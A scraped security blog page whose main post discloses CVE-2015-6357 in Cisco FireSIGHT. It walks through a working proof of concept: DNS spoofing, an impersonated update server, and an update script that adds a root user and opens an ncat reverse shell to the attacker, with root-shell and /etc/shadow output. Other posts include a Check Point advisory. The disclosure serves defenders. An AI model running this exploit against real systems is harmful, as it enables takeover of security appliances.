update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
command to perform the download from [Sourcefire Support](https://support.sourcefire.com "Sourcefire support"). The
invocation of the `curl` command is passed the `-k` (aka `--insecure`) option
which tells `curl` to not validate any SSL certificates presented by the server.

Here is the the `ps` output of the server downloading an update:

```
admin@FIRESIGHT01:/var/sf$ ps -auxwww | grep curl
root      8351  0.0  0.0  37396  2708 ?        S    02:02   0:00 /usr/local/bin/curl -k -o /var/sf/updates/Sourcefire_Geodb_Update-2015-08-17-002.sh https://support.sourcefire.com/auto-update/auto-dl.cgi/XX:XX:XX:XX:XX:XX:XX/Download/files/Sourcefire_Geodb_Update-2015-08-17-002.sh

```

FireSIGHT updates come in the form of a [makeself](https://github.com/megastep/makeself "makeself") generated shell script
that contains both UNIX Bourne shell commands as well as the binary data
to be delivered in the update. These shell update shell scripts are executed
directly on the FireSIGHT server as the local `www` user.

An attacker that is able to perform a man in the middle attack against
a FireSIGHT server can force it to connect to a spoofed version of the
[Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site and download a malicious update script that
will execute any command the attacker wishes on the FireSIGHT server.

The SSL Validation vulnerability enables this to occur resulting in the system
happily ignoring the attackers spoofed SSL certificate and downloading the
malicious update and executing it.

If the `curl` command were to validate the SSL certificate then it would fail
to download the malicious script and protect the FireSIGHT server from the
attacker.

This exploit demonstrates the danger of not validating the SSL certificate
by exploiting the vulnerability to gain remote command execution as the root
user.

## The Attack Scenario

The attack scenario is one where an attacker has attained the ability to man in
the middle the traffic from the FireSIGHT server to the
<https://support.sourcefire.com> web site. The simplest way to demonstrate this
is to set up a “compromised” DNS server that responds to queries for the domain
`support.sourcefire.com` with the IP address of a web server that the attacker
controls.

In a real attack scenario the attacker may use any number of man in the middle
techniques to acheive the same means. Such as:

* DNS cache poisioning
* ARP spoofing. e.g ettercap.

This exploit was tested against the following FireSIGHT Virtual Appliance versions:

* 5.2.0
* 5.3.0
* 5.4.0
* 5.4.1.1
* 5.4.1.2

In the PoC below the FireSIGHT server was assigned the IP address `192.168.1.99`.

The attacking host was running Kali Linux 2.0 though the set up below
should work on any Debian Linux based server. The IP address of the Kali host
in the example below is `192.168.1.1`. The Kali host is used to run the DNS server
as well as the spoofed [Sourcefire Support](https://support.sourcefire.com "Sourcefire support") web site.

## Set up dnsmasq

The exploit requires the ability to spoof the DNS response for
`support.sourcefire.com`. A dnsmasq server is run to provide this capability and
act as the “compromised” DNS server.

Install dnsmasq:

```
root@kali# apt-get install dnsmasq

```

Configure dnsmasq:

```
root@kali# cat << EOF > /etc/dnsmasq.d/firepnwer.conf
address=/support.sourcefire.com/192.168.1.1
server=8.8.8.8
EOF

```

Edit the IP address on the `address` line to be the address
of the web server you will serve the updates from.

Start dnsmasq:

```
root@kali# service dnsmasq start

```
## Set up nginx

A web server is required to serve the exploit to the FireSIGHT server when it
requests an update.

Install nginx web server:

```
root@kali# apt-get install nginx

```

Create a self signed certificate to impersonate `support.sourcefire.com`:

```
root@kali# mkdir /etc/nginx/ssl

root@kali# openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout /etc/nginx/ssl/nginx.key \
 -out /etc/nginx/ssl/nginx.crt

Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:New South Wales
Locality Name (eg, city) []:Newcastle
Organization Name (eg, company) [Internet Widgits Pty Ltd]:FirePWNER Exploit.
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:support.sourcefire.com
Email Address []:

```

Configure nginx by replacing the contents of
`/etc/nginx/sites-available/default` with:

```
server {
    listen 80 default_server;
    listen [::]:80 default_server;

    listen 443 ssl;

    root /var/www/html;

    index index.html index.htm index.nginx-debian.html;

    server_name support.sourcefire.com;
    ssl_certificate /etc/nginx/ssl/nginx.crt;
    ssl_certificate_key /etc/nginx/ssl/nginx.key;

    location / {
        try_files $uri $uri/ =404;
    }

    # rewrite requests that contain the clients license key
    location ~* /auto-update/auto-dl.cgi/[A-F0-9][A-F0-9]:.* {
        rewrite ^(/auto-update/auto-dl.cgi)/[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]:[A-F0-9][A-F0-9]/(.*)$ $1/$2;
    }

    location /auto-update {
        root /var/www/html/firepwner;
    }

}

```

Start nginx:

```
root@kali# service nginx start

```
## Setting up the exploit

The FirePWNER exploit requires two files to be served from the web server. The
first file is the update manifest which is an XML file that contains a list of
the updates available, their download location and MD5 hashes.

First you need to create some directories:

```
root@kali# mkdir \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/{Download/files,GetCurrent}

```

Then copy the exploit files into them:

```
root@kali# cp sf.xml /var/www/html/firepwner/auto-update/auto-dl.cgi/GetCurrent/sf.xml
root@kali# cp firepwner.sh \
    /var/www/html/firepwner/auto-update/auto-dl.cgi/Download/files/firepwner.sh

```

After copying these files you should be able to browse to
`http://192.168.1.1/auto-update/auto-dl.cgi/GetCurrent/sf.xml`

## Configure the FireSIGHT server DNS

Next, for exploit demonstration purposes, the FireSIGHT server needs to be configured to
use the “compromised” DNS server. Login to the FireSIGHT web portal and go to
`System > Local > Configure > Management Interfaces` and set the Primary DNS server to
the IP address of the “compromised” DNS server (192.168.1.1) and save the change.

## Running the Exploit

The exploit uses the `ncat` command installed by default on the FireSIGHT
server to create a reverse shell to the Kali host. On the Kali host you need to
listen for the reverse shell connection from the FireSIGHT server:

```
root@kali# ncat -v -l 4444

```

Then on the FireSIGHT web portal browse to `System > Updates > Rule Updates`
and select `Download new rule update from the Support Site` and click the
`Import` button. The server will then download the `sf.xml` update manifest from
the attacker’s server, see that there is an update available and will
download the update and execute it as the `www` user. The update/exploit script
below takes advantage of the fact that the `www` user has a number of `sudo` commands
it can run including `useradd`. The exploit creates a new `toor` user with an
empty passwd and then uses `su` to elevate privileges and start a reverse shell
connection back to the attackers server.

```
#!/bin/sh
# add a new UID 0 "toor" user with an empty password
sudo useradd -o -p '$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.' -g root -c toor -u 0 -s /bin/sh \
 -d /root toor
# su to toor and start the reverse shell
echo | su - toor -c "/usr/local/sf/nmap/bin/ncat -e /bin/sh support.sourcefire.com 4444"
exit 0

```

The exploit script may be changed to run any other desired commands. If the
script is changed then the `<md5sum>` XML tag value in `sf.xml` must be updated
with the new MD5 hash of the exploit script.

This is an example of the output you should see on the Kali host when the
exploit is successful and a remote shell on the FireSIGHT server is opened and
the `id` and `cat /etc/passwd` commands are run:

```
root@kali# ncat -v -l 4444
Ncat: Version 6.49BETA4 ( http://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.1.99.
Ncat: Connection from 192.168.1.99:41637.
id
uid=0(root) gid=0(root) groups=0(root)
cat /etc/shadow
root:x:11869:0:::::
bin:*:9797:0:::::
daemon:*:9797:0:::::
mysql:*:9797:0:::::
nobody:*:9797:0:::::
sshd:*:9797:0:::::
www:*:9797:0:::::
sfsnort:*:9797:0:::::
sfremediation:*:9797:0:::::
sfrna:*:9797:0:::::
snorty:*:9797:0:::::
admin:$6$GCOeXpyR$Qhq6Eq5aSW8n.15RajwYrHVLud8NaN4aKEkVXC43I5m/X.ux/bgIHAplYifOaxTIxaIThqOBGmZgO5aey5tjE/:11869:0:::::
toor:$1$FuV6TnrC$rKJCjOHJXuFhl2djLOBmF.:16679:0:99999:7:::

```
## Obtaining the Exploit

The files used in this exploit may be obtained from [github](https://github.com/mattimustang/firepwner "CVE-2015-6357 Exploit Code").

## Disclosure Timeline

* 2015-08-31 Vulnerability discovered in FireSIGHT 5.4.x and exploit developed
  by Matthew Flanagan.
* 2015-09-01 Initial contact made with Cisco PSIRT psirt@cisco.com.
* 2015-09-01 PSIRT responded asking for more information.
* 2015-09-01 Matthew Flanagan provided PSIRT with full write up and exploit of vulnerability.
* 2015-09-02 PSIRT raised FireSIGHT defect and incident PSIRT-190974966.
* 2015-09-15 Matthew Flanagan reported to Cisco PSIRT that versions 5.2.0 and 5.3.0 are also
  vulnerable.
* 2015-10-16 PSIRT advised me of the CVSS score they assigned to the vulnerability.
* 2015-11-09 PSIRT assigned CVE ID CVE-2015-6357.
* 2015-11-16 [Cisco FireSIGHT Management Center Certificate Validation
  Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") published.
* 2015-11-16 Matthew Flanagan’s findings published.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[21:20](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html "permanent link")

[No comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/1013694973102085061)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/1013694973102085061 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=1013694973102085061&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=1013694973102085061&target=pinterest "Share to Pinterest")

Labels:
[cisco](https://wadofstuff.blogspot.com/search/label/cisco),
[cve](https://wadofstuff.blogspot.com/search/label/cve),
[exploit](https://wadofstuff.blogspot.com/search/label/exploit),
[security](https://wadofstuff.blogspot.com/search/label/security)

## Thursday, 9 April 2015

### [Project Repositories Have Moved to GitHub](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html)

With Google [announcing](http://google-opensource.blogspot.com.au/2015/03/farewell-to-google-code.html) last month that they are shutting down Google Code I have moved my old and unloved code repositories to [GitHub](https://github.com/mattimustang?tab=repositories). The main code base that seems to still be in use by others is the [Django Full Serializer](https://github.com/mattimustang/wadofstuff/tree/master/python/serializer) which I may split out into its own repository one day.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[09:05](https://wadofstuff.blogspot.com/2015/04/project-repositories-have-moved-to.html "permanent link")

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/8477638678327820576 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=8477638678327820576&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=8477638678327820576&target=pinterest "Share to Pinterest")

Labels:
[django](https://wadofstuff.blogspot.com/search/label/django),
[programming](https://wadofstuff.blogspot.com/search/label/programming),
[serializer](https://wadofstuff.blogspot.com/search/label/serializer)

## Friday, 9 March 2012

### [Creating Stronger Self-Signed SSL Certificates For Testing](https://wadofstuff.blogspot.com/2012/03/creating-stronger-self-signed-ssl.html)

I prefer to use [Google Chrome (developer channel)](https://www.google.com/chrome) as my web browser and recently it began complaining about the self-signed SSL certificates I was using on a number of internal web applications I have developed. The error Chrome displayed was:

![SSL Error Icon](data:image/png;base64...)
The site's security certificate is signed using a weak signature algorithm!
[snip]

I originally created the certificates using the instructions in the [Apache SSL FAQ](http://httpd.apache.org/docs/2.0/ssl/ssl_faq.html#selfcert). It turns out that this results in SSL certificates that use the weaker MD5 signature hash algorithm which is the cause of the complaint. This is easily fixed by adding '-sha1' to the openssl command line when generating the certificate. Like so:

$ openssl req -new -x509 -sha1 -nodes -out server.crt -keyout server.key

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[10:16](https://wadofstuff.blogspot.com/2012/03/creating-stronger-self-signed-ssl.html "permanent link")

[4 comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/5009719727639654922)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/5009719727639654922 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=5009719727639654922&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=5009719727639654922&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=5009719727639654922&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=5009719727639654922&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=5009719727639654922&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=5009719727639654922&target=pinterest "Share to Pinterest")

Labels:
[apache](https://wadofstuff.blogspot.com/search/label/apache),
[security](https://wadofstuff.blogspot.com/search/label/security)

## Tuesday, 16 August 2011

### [Security Advisory: Symlink Following and Second-Order Symlink Vulnerabilities in Multiple Check Point Security Management Products](https://wadofstuff.blogspot.com/2011/08/security-advisory-symlink-following-and.html)

**Product:** Check Point Security Management:

* Multi-Domain Security Management / Provider-1
* SmartCenter

**Vulnerable version:** multiple products, see sections below

**Fixed version:** multiple products, see sections below

**CVE number:** CVE-2011-2664

**Impact:** high

**Homepage:** http://www.checkpoint.com

**Found:** 2010-08-13

**By:** Matthew Flanagan http://wadofstuff.blogspot.com

Vendor Product Description

**[Security Management](http://www.checkpoint.com/products/multi-domain-security-management/index.html)**

> Security Management and Multi-Domain Security Management (Provider-1) delivers more security and control by segmenting your security management into multiple virtual domains. Businesses of all sizes can easily create virtual domains based on geography, business unit or security function to strengthen security and simplify management.

**[UTM-1 Edge](http://www.checkpoint.com/products/utm-1-edge/index.html)**

> Check Point UTM-1 Edge appliances deliver proven, best-in-class security right out of the box! These simple, all-in-one appliances allow branch offices to deploy comprehensive security quickly and easily. These appliances offer robust performance, powerful central management and advanced wireless options.

Vulnerability Description

A post-installation shell script is executed both in the provisioning of a Security Management Domain and installation of a standalone SmartCenter. The script is used to generate a configuration file for use by the SofaWare Management Server (SMS). The SMS is used to send all configuration changes performed in the SmartCenter/Management Domain to UTM-1 Edge devices. UTM-1 Edge devices also communicate their status to the SmartCenter/Management Domain via SMS.

Due to the combination of inadequate file checks, predictable file names and writing of temporary configuration files to /tmp it is possible for a unprivileged local user to exploit the post-installation script to overwrite arbitrary files on the security management system through symlink following.

The script also contains a [second-order symlink vulnerability](http://www.securityfocus.com/archive/1/401682) which makes it possible for an attacker to gain control of the SMS configuration file: $FWDIR/conf/sofaware/SWManagementServer.ini. The SWManagementServer.ini file contains sensitive information and configuration parameters for the management of UTM-1 Edge firewall appliances such as firmware versions, mail proxies, logging levels, and many timeout and polling intervals for various software components running on the Edge devices.

The likelhood of exploiting this vulnerability on a server running SmartCenter is low due to it only being exploitable during the installation of the software. However, for Management Domains running on a Multi-Domain Management / Provider-1 server the likelihood is much higher as the vulnerability can be exploited every time a new Management Domain is created.

Exploit

An exploit will not be published.

Vulnerable Versions

R65.70

R70.40

R71.30

R75.10

On Linux, SecurePlatform and Solaris.

Solution

Fixed in R71.40 and R75.20. Other versions can get fix from [Check Point](https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk63565)

[advisory page](https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=syyk63565).

Advisories

<https://supportcenter.checkpoint.com/supportcenter/portal?eventSubmit_doGoviewsolutiondetails=&solutionid=sk63565>

Vendor Contact Timeline

2010-08-16: Contacted Check Point security team security-alert () checkpoint.com.

2010-08-16: Vendor responded.

2010-08-16: Provided vulnerability details and exploit to vendor.

2010-08-18: Vendor confirmation of vulnerability.

2010-08-26: Requested a status update from the vendor.

2010-08-28: Vendor: working on a fix and release plan.

2011-05-31: Requested a status update from the vendor.

2011-06-01: Vendor: Fixed in R75. Advisory to be released on 2011-06-15.

2011-06-06: Advised vendor that R75 GA and R75.10 are still vulnerable.

2011-06-06: Applied for CVE number from MITRE.

2011-06-07 - 2011-06-14: Coordinated fix and advisory release with Check Point.

2011-06-14: Sent more details to MITRE.

2011-06-15: Vendor publishes advisory and fix.

2011-06-16: Contacted AusCERT.

2011-07-06: Asked MITRE for status of CVE number allocation.

2011-07-07: Assigned CVE number by MITRE.

2011-08-16: Released advisory.

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[18:55](https://wadofstuff.blogspot.com/2011/08/security-advisory-symlink-following-and.html "permanent link")

[2 comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/4108244290998996832)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/4108244290998996832 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=4108244290998996832&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=4108244290998996832&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=4108244290998996832&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=4108244290998996832&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=4108244290998996832&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=4108244290998996832&target=pinterest "Share to Pinterest")

Labels:
[advisory](https://wadofstuff.blogspot.com/search/label/advisory),
[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint),
[security](https://wadofstuff.blogspot.com/search/label/security)

## Tuesday, 12 July 2011

### [SST/JASS 4.2.2 is out](https://wadofstuff.blogspot.com/2011/07/sstjass-422-is-out.html)

Jason Callaway has [posted a new version of SST (aka JASS](http://blogs.oracle.com/sst/entry/sst_lv_4_2_2)). The new release of version 4.2.2 addresses a change in passwd behaviour in relation to locking NP accounts.

[Download the new version.](http://hub.opensolaris.org/bin/download/Project%2Bsst/files/SUNWjass-4.2.2.pkg.gz)

Posted by

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876 "author profile")

at

[15:24](https://wadofstuff.blogspot.com/2011/07/sstjass-422-is-out.html "permanent link")

[No comments:](https://www.blogger.com/comment/fullpage/post/4770774760495172381/2145973291153023618)

[![](https://resources.blogblog.com/img/icon18_email.gif)](https://www.blogger.com/email-post/4770774760495172381/2145973291153023618 "Email Post")

[![](https://resources.blogblog.com/img/icon18_edit_allbkg.gif)](https://www.blogger.com/post-edit.g?blogID=4770774760495172381&postID=2145973291153023618&from=pencil "Edit Post")

[Email This](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=2145973291153023618&target=email "Email This")[BlogThis!](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=2145973291153023618&target=blog "BlogThis!")[Share to X](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=2145973291153023618&target=twitter "Share to X")[Share to Facebook](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=2145973291153023618&target=facebook "Share to Facebook")[Share to Pinterest](https://www.blogger.com/share-post.g?blogID=4770774760495172381&postID=2145973291153023618&target=pinterest "Share to Pinterest")

Labels:
[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart),
[solaris](https://wadofstuff.blogspot.com/search/label/solaris),
[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)

[Older Posts](https://wadofstuff.blogspot.com/search?updated-max=2011-07-12T15:24:00%2B10:00&max-results=5 "Older Posts")

[Home](https://wadofstuff.blogspot.com/)

Subscribe to:
[Posts (Atom)](https://wadofstuff.blogspot.com/feeds/posts/default)

## About Me

[Matthew Flanagan](https://www.blogger.com/profile/15093905875465763876)

[View my complete profile](https://www.blogger.com/profile/15093905875465763876)

## Subscribe To

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fposts%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/posts/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
Posts

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

[![](https://resources.blogblog.com/img/widgets/subscribe-netvibes.png)](https://www.netvibes.com/subscribe.php?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/widgets/subscribe-yahoo.png)](https://add.my.yahoo.com/content?url=https%3A%2F%2Fwadofstuff.blogspot.com%2Ffeeds%2Fcomments%2Fdefault)
[![](https://resources.blogblog.com/img/icon_feed12.png)
Atom](https://wadofstuff.blogspot.com/feeds/comments/default)

![](https://resources.blogblog.com/img/widgets/arrow_dropdown.gif)
![](https://resources.blogblog.com/img/icon_feed12.png)
All Comments

## Labels

[advisory](https://wadofstuff.blogspot.com/search/label/advisory)
(1)

[apache](https://wadofstuff.blogspot.com/search/label/apache)
(2)

[apple](https://wadofstuff.blogspot.com/search/label/apple)
(3)

[buildbot](https://wadofstuff.blogspot.com/search/label/buildbot)
(2)

[checkpoint](https://wadofstuff.blogspot.com/search/label/checkpoint)
(1)

[cisco](https://wadofstuff.blogspot.com/search/label/cisco)
(1)

[cve](https://wadofstuff.blogspot.com/search/label/cve)
(1)

[dhcp](https://wadofstuff.blogspot.com/search/label/dhcp)
(2)

[django](https://wadofstuff.blogspot.com/search/label/django)
(12)

[dtrace](https://wadofstuff.blogspot.com/search/label/dtrace)
(1)

[exploit](https://wadofstuff.blogspot.com/search/label/exploit)
(1)

[flash archive](https://wadofstuff.blogspot.com/search/label/flash%20archive)
(4)

[forms](https://wadofstuff.blogspot.com/search/label/forms)
(2)

[infrastructure](https://wadofstuff.blogspot.com/search/label/infrastructure)
(5)

[iphoto](https://wadofstuff.blogspot.com/search/label/iphoto)
(3)

[ipv4](https://wadofstuff.blogspot.com/search/label/ipv4)
(6)

[ipv6](https://wadofstuff.blogspot.com/search/label/ipv6)
(7)

[jass](https://wadofstuff.blogspot.com/search/label/jass)
(7)

[json](https://wadofstuff.blogspot.com/search/label/json)
(3)

[jumpstart](https://wadofstuff.blogspot.com/search/label/jumpstart)
(10)

[macosx](https://wadofstuff.blogspot.com/search/label/macosx)
(2)

[models](https://wadofstuff.blogspot.com/search/label/models)
(1)

[networking](https://wadofstuff.blogspot.com/search/label/networking)
(4)

[nfs](https://wadofstuff.blogspot.com/search/label/nfs)
(2)

[nmap](https://wadofstuff.blogspot.com/search/label/nmap)
(2)

[openvpn](https://wadofstuff.blogspot.com/search/label/openvpn)
(1)

[perl](https://wadofstuff.blogspot.com/search/label/perl)
(1)

[programming](https://wadofstuff.blogspot.com/search/label/programming)
(9)

[python](https://wadofstuff.blogspot.com/search/label/python)
(14)

[ruby](https://wadofstuff.blogspot.com/search/label/ruby)
(1)

[security](https://wadofstuff.blogspot.com/search/label/security)
(3)

[serializer](https://wadofstuff.blogspot.com/search/label/serializer)
(4)

[servicetags](https://wadofstuff.blogspot.com/search/label/servicetags)
(2)

[smf](https://wadofstuff.blogspot.com/search/label/smf)
(6)

[solaris](https://wadofstuff.blogspot.com/search/label/solaris)
(31)

[splunk](https://wadofstuff.blogspot.com/search/label/splunk)
(4)

[sst jass](https://wadofstuff.blogspot.com/search/label/sst%20jass)
(1)

[testing](https://wadofstuff.blogspot.com/search/label/testing)
(1)

[zfs](https://wadofstuff.blogspot.com/search/label/zfs)
(3)

## Blog Archive

* ▼
  [2015](https://wadofstuff.blogspot.com/2015/)
  (2)
  + ▼
    [November](https://wadofstuff.blogspot.com/2015/11/)
    (1)
    - [CVE-2015-6357: FirePWNER Exploit for Cisco FireSIG...](https://wadofstuff.blogspot.com/2015/11/cve-2015-6357-firepwner-exploit-for.html)
  + ►
    [April](https://wadofstuff.blogspot.com/2015/04/)
    (1)

* ►
  [2012](https://wadofstuff.blogspot.com/2012/)
  (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2012/03/)
    (1)

* ►
  [2011](https://wadofstuff.blogspot.com/2011/)
  (4)
  + ►
    [August](https://wadofstuff.blogspot.com/2011/08/)
    (1)
  + ►
    [July](https://wadofstuff.blogspot.com/2011/07/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2011/06/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2011/02/)
    (1)

* ►
  [2010](https://wadofstuff.blogspot.com/2010/)
  (4)
  + ►
    [December](https://wadofstuff.blogspot.com/2010/12/)
    (1)
  + ►
    [November](https://wadofstuff.blogspot.com/2010/11/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2010/09/)
    (2)

* ►
  [2009](https://wadofstuff.blogspot.com/2009/)
  (18)
  + ►
    [November](https://wadofstuff.blogspot.com/2009/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2009/10/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2009/08/)
    (2)
  + ►
    [July](https://wadofstuff.blogspot.com/2009/07/)
    (4)
  + ►
    [May](https://wadofstuff.blogspot.com/2009/05/)
    (3)
  + ►
    [April](https://wadofstuff.blogspot.com/2009/04/)
    (1)
  + ►
    [March](https://wadofstuff.blogspot.com/2009/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2009/02/)
    (3)

* ►
  [2008](https://wadofstuff.blogspot.com/2008/)
  (8)
  + ►
    [September](https://wadofstuff.blogspot.com/2008/09/)
    (1)
  + ►
    [June](https://wadofstuff.blogspot.com/2008/06/)
    (2)
  + ►
    [April](https://wadofstuff.blogspot.com/2008/04/)
    (3)
  + ►
    [March](https://wadofstuff.blogspot.com/2008/03/)
    (1)
  + ►
    [February](https://wadofstuff.blogspot.com/2008/02/)
    (1)

* ►
  [2007](https://wadofstuff.blogspot.com/2007/)
  (20)
  + ►
    [November](https://wadofstuff.blogspot.com/2007/11/)
    (2)
  + ►
    [October](https://wadofstuff.blogspot.com/2007/10/)
    (1)
  + ►
    [September](https://wadofstuff.blogspot.com/2007/09/)
    (2)
  + ►
    [August](https://wadofstuff.blogspot.com/2007/08/)
    (2)
  + ►
    [May](https://wadofstuff.blogspot.com/2007/05/)
    (2)
  + ►
    [March](https://wadofstuff.blogspot.com/2007/03/)
    (5)
  + ►
    [February](https://wadofstuff.blogspot.com/2007/02/)
    (4)
  + ►
    [January](https://wadofstuff.blogspot.com/2007/01/)
    (2)

## Projects

* [Wad of Stuff code repository](https://github.com/mattimustang/wadofstuff)
* [iPhoto Keyword Utilities](https://github.com/mattimustang/iphotokeywordutilities)

|  |  |
| --- | --- |

Travel theme. Theme images by [sandsun](http://www.istockphoto.com/googleimages.php?id=7944350&platform=blogger&langregion=en_GB). Powered by [Blogger](https://www.blogger.com).



=== Content from wadofstuff.blogspot.com.au_b0ffa14a_20250125_072857.html ===


# [Wad of Stuff](https://wadofstuff.blogspot.com/)

IT infrastructure automation, security research, tools, tips and tricks.

## Monday, 16 November 2015

### CVE-2015-6357: FirePWNER Exploit for Cisco FireSIGHT Management Center SSL Validation Vulnerability

## Introduction

On its own the [Cisco FireSIGHT Management Center Certificate Validation
Vulnerability](http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151116-fmc "Cisco FireSIGHT Management Center Certificate Validation Vulnerability") is a **medium** severity vulnerability with a **CVSS** of **5.1**.
However, this vulnerability is an example of why SSL certificate validation is so
important. In this exploit I will demonstrate how the vulnerability can be leveraged
to obtain privileged remote command execution on a Cisco FireSIGHT system. The
exploit chains the SSL validation vulnerability with the software update process
on the Cisco FireSIGHT system to trick the target system into downloading a malicious
update and executing it to obtain a reverse shell with **root** privileges.

![AND THAT'S WHY YOU SHOULD ALWAYS VALIDATE SSL CERTIFICATES](https://i.imgflip.com/u60wm.jpg)

## The Vulnerability

The Cisco FireSIGHT Management Center appliance is used to manage Cisco
FirePOWER Intrusion Prevention Systems (IPS), also known as Sourcefire IPS.
FireSIGHT is responsible for downloading updated IPS signatures and installing
them on managed IPS devices.

The FireSIGHT Management Center allows an administrator to manually initiate an
update of the IPS rules or schedule the updates to occur daily/weekly/monthly.

When the FireSIGHT Management Center performs an update it uses the `curl` UNIX
